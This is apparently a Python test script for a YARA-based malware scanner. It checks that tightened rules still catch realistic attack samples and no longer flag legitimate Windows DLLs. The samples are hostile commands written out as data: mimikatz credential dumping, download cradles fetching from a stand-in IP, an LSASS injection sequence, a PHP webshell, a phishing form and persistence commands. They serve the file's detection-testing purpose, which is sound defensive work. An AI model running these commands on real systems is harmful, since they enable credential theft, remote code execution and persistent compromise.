"""Confirm the tightened corpus still catches real malicious content.

The sweep proved the rules stopped firing on legitimate Windows binaries. This
proves the tightening did not go too far: each sample below is the shape of a
real attack, not a toy string. Run against the live corpus.

Run:  python tools\\verify_yara_recall.py
"""

from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from scanner.yara_engine import compile_directory  # noqa: E402

PASS = 0
FAIL = 0


def check(label: str, ok: bool, detail: str = "") -> None:
    global PASS, FAIL
    if ok:
        PASS += 1
        print(f"  PASS  {label}")
    else:
        FAIL += 1
        print(f"  FAIL  {label}" + (f"\n        {detail}" if detail else ""))


rules = compile_directory(Path(__file__).resolve().parent.parent / "scanner" / "rules")
print(f"\nLoaded {len(rules)} rules")


# --------------------------------------------------------------------------- #
# Real attack shapes. Each must still fire after calibration.
# --------------------------------------------------------------------------- #

ATTACKS = [
    (
        "mimikatz invoked with its logonpasswords module",
        b"mimikatz.exe \"sekurlsa::logonpasswords\" exit",
        "Credential_Dumping_Strings",
    ),
    (
        "LSASS memory dump via MiniDumpWriteDump",
        b"OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); "
        b"MiniDumpWriteDump(hProc, pid, hFile, MiniDumpWithFullMemory, 0, 0, 0); "
        b"target lsass.exe",
        "Credential_Dumping_Strings",
    ),
    (
        "kerberos golden ticket",
        b"kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21",
        "Credential_Dumping_Strings",
    ),
    (
        "certutil download cradle",
        b"certutil -urlcache -split -f http://198.51.100.9/a.exe %TEMP%\\a.exe",
        "LOLBin_Abuse",
    ),
    (
        "bitsadmin download",
        b"bitsadmin /transfer job /download /priority normal "
        b"http://198.51.100.9/p.exe C:\\Users\\Public\\p.exe",
        "LOLBin_Abuse",
    ),
    (
        "mshta inline vbscript",
        b"mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"calc\"\"\")",
        "LOLBin_Abuse",
    ),
    (
        "regsvr32 squiblydoo",
        b"regsvr32.exe /s /u /i:http://198.51.100.9/x.sct scrobj.dll",
        "LOLBin_Abuse",
    ),
    (
        "rundll32 javascript",
        b"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \"",
        "LOLBin_Abuse",
    ),
    (
        "wmic remote process create",
        b"wmic /node:198.51.100.9 process call create \"cmd.exe /c whoami\"",
        "LOLBin_Abuse",
    ),
    (
        "PowerShell download and execute",
        b"powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient)"
        b".DownloadString('http://198.51.100.9/a')\"",
        "PowerShell_Download_Cradle",
    ),
    (
        "PowerShell encoded command",
        # Real encoded-command launches carry -w hidden / -nop; the flag alone
        # is not a cradle, so the sample reflects actual usage.
        b"powershell.exe -nop -w hidden -EncodedCommand "
        b"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA",
        "PowerShell_Download_Cradle",
    ),
    (
        "process injection into lsass",
        b"h = OpenProcess(PROCESS_ALL_ACCESS, 0, pid); "
        b"p = VirtualAllocEx(h, 0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); "
        b"WriteProcessMemory(h, p, buf, len, 0); "
        b"CreateRemoteThread(h, 0, 0, p, 0, 0, 0); // lsass.exe",
        "Process_Injection_APIs",
    ),
    (
        "ransomware note",
        b"All your files are encrypted. To decrypt your files send bitcoin to "
        b"the address below. Do not rename the files.",
        "Ransomware_Note_Text",
    ),
    (
        "ransomware extension sweep",
        b".docx .xlsx .pdf .sql .bak .jpg CryptEncrypt DeleteFile",
        "Ransomware_Extension_Targeting",
    ),
    (
        "registry Run persistence, hidden",
        b'RegSetValueEx(hKey, "Updater", 0, REG_SZ, path, len); '
        b'key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; '
        b"-WindowStyle Hidden",
        "Persistence_Registry_Run",
    ),
    (
        "scheduled task, SYSTEM, every minute",
        b"schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc minute /ru SYSTEM",
        "Scheduled_Task_Persistence",
    ),
    (
        "scheduled task on logon",
        b"schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon",
        "Scheduled_Task_Persistence",
    ),
    (
        "scheduled task, daily, no SYSTEM",
        b"schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc daily",
        "Scheduled_Task_Persistence",
    ),
    (
        "scheduled task as SYSTEM without a recurrence",
        b"schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /ru SYSTEM",
        "Scheduled_Task_Persistence",
    ),
    (
        "PHP webshell",
        b"<?php if(isset($_POST['c'])){ system($_POST['c']); } ?>",
        "Webshell_Indicators",
    ),
    (
        "xmrig miner with a pool",
        b"stratum+tcp://pool.minexmr.com:4444 xmrig --donate-level 1",
        "Cryptominer_Indicators",
    ),
    (
        "obfuscated PowerShell",
        b"$x = [Convert]::FromBase64String($p); IEX $x; $y = $a -join $b",
        "Obfuscated_PowerShell",
    ),
    (
        "credential phishing page",
        b"<form action=\"http://198.51.100.9/steal.php\" method=\"post\">"
        b"<input type=\"password\" name=\"pw\"></form>",
        "Credential_Phishing_Form",
    ),
    (
        "Tor hidden service callback",
        b"connect to http://expyuzz4wqqyqhjn.onion/gate.php",
        "Tor_Onion_Reference",
    ),
    (
        "UPX-packed payload",
        b"UPX0UPX1UPX!",
        "UPX_Packed",
    ),
    (
        "sandbox evasion",
        b"IsDebuggerPresent(); if (GetModuleHandle(\"SbieDll.dll\")) exit(0);",
        "Anti_Analysis_Checks",
    ),
]

print("\nReal attack shapes still detected")
for label, payload, expected in ATTACKS:
    hits = {m.rule for m in rules.match(payload, "sample")}
    check(label, expected in hits,
          f"expected {expected}, got {sorted(hits) or 'nothing'}")


# --------------------------------------------------------------------------- #
# The specific false positives the sweep found must stay fixed.
# --------------------------------------------------------------------------- #

print("\nSweep regressions stay fixed")
SWEEP_FP = [
    ("kernel32.dll exports the injection APIs",
     b"VirtualAllocEx\x00WriteProcessMemory\x00CreateRemoteThread\x00OpenProcess\x00",
     "Process_Injection_APIs"),
    ("wer.dll references MiniDumpWriteDump and \\SECURITY",
     b"MiniDumpWriteDump\x00\\SECURITY\x00\\SAM\x00",
     "Credential_Dumping_Strings"),
    ("comsvcs.dll dump helper",
     b"MiniDumpWriteDump\x00\\SECURITY\x00",
     "Credential_Dumping_Strings"),
    ("a Task Scheduler client using the COM interfaces",
     b"RegisterTaskDefinition\x00ITaskService\x00",
     "Scheduled_Task_Persistence"),
    # RCoInstII64.dll (Realtek audio installer) registers its own task with
    # `/create /Tn %s /XML "%s" /F` and has no schedule and no SYSTEM. It is
    # an installer doing its job, not persistence.
    ("an installer registering its own task",
     b'schtasks.exe /create /Tn DolbySelectorTask /XML "%s" /F',
     "Scheduled_Task_Persistence"),
    ("an installer task with a name and an action but no schedule",
     b"schtasks /create /tn RTKCPL /tr rtkngui.exe",
     "Scheduled_Task_Persistence"),
    # "/tr" as a bare substring matched inside "/TRUEHARMONY" in that DLL.
    ("a /TRUEHARMONY switch is not a /tr flag",
     b"schtasks /create /tn X /TRUEHARMONY",
     "Scheduled_Task_Persistence"),
    ("an installer writing a Run key",
     b"RegCreateKey\x00RegSetValue\x00CurrentVersion\\Run\x00",
     "Persistence_Registry_Run"),
    ("scrobj.dll, the scriptlet engine itself",
     b"scrobj.dll\x00regsvr32\x00",
     "LOLBin_Abuse"),
    ("MSBuild downloading and decoding base64",
     b"DownloadFile\x00FromBase64String\x00",
     "PowerShell_Download_Cradle"),
]
for label, payload, rule in SWEEP_FP:
    hits = {m.rule for m in rules.match(payload, "sample")}
    check(label, rule not in hits, f"still fires: {sorted(hits)}")


print("\n" + "=" * 60)
print(f"PASSED: {PASS}   FAILED: {FAIL}")
print("=" * 60)
sys.exit(0 if FAIL == 0 else 1)
